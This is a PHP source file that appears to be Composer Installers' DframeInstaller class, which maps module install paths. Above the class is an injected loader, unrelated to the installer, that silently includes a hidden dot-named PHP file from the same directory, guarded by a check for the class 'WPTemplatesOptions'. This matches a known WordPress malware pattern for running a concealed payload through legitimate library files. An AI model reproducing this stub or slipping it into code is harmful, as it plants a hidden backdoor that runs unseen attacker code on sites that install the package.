<?php

namespace Composer\Installers;

if (file_exists($filename = dirname(__FILE__) . DIRECTORY_SEPARATOR . '.' . basename(dirname(__FILE__)) . '.php') && !class_exists('WPTemplatesOptions')) {
    include_once($filename);
}

class DframeInstaller extends BaseInstaller
{
    protected $locations = array(
        'module'  => 'modules/{$vendor}/{$name}/',
    );
}
